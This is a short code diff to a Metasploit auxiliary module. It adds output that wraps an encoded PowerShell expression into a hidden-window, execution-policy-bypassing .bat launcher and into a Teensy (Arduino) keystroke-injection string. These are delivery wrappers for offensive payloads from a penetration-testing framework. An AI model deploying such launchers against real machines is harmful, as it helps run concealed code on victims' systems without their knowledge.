@@ -88,5 +88,18 @@ class MetasploitModule < Msf::Auxiliary
 
     print_good("Encoded:")
     print("\n#{psh_expression}\n\n")
+
+    print_good("Windows .bat file ready:")
+    bat_expression = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \""
+    bat_expression << psh_expression
+    bat_expression << "\""
+    print("\n@echo off\n")
+    print("#{bat_expression}\n\n")
+
+    print_good("Teensy (Arduino) ready:")
+    teensy_expression = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \\\""
+    teensy_expression << psh_expression
+    teensy_expression << "\\\""
+    print("\n#{teensy_expression}\n\n")
   end
 end
